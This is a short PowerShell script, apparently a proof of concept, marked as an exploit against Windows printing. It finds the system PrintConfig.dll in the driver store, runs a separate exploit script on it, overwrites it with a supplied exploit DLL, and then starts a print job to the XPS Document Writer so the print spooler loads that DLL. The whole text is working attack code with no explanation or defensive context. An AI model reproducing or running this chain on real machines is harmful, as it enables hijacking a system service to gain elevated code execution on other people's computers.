
# exploit
$Target = (get-item 'C:\windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_*\Amd64\PrintConfig.dll').fullname
.\exploit.ps1 -TargetFile $Target

# overwrite file with dll
Copy-Item exploit.dll $Target

# trigger print job
Add-Type -AssemblyName System.Printing
$PrintServer = new-object System.Printing.PrintServer
$Queue = $PrintServer.GetPrintQueue('Microsoft XPS Document Writer')
$Job = $Queue.AddJob()
$Job.JobStream.Close()
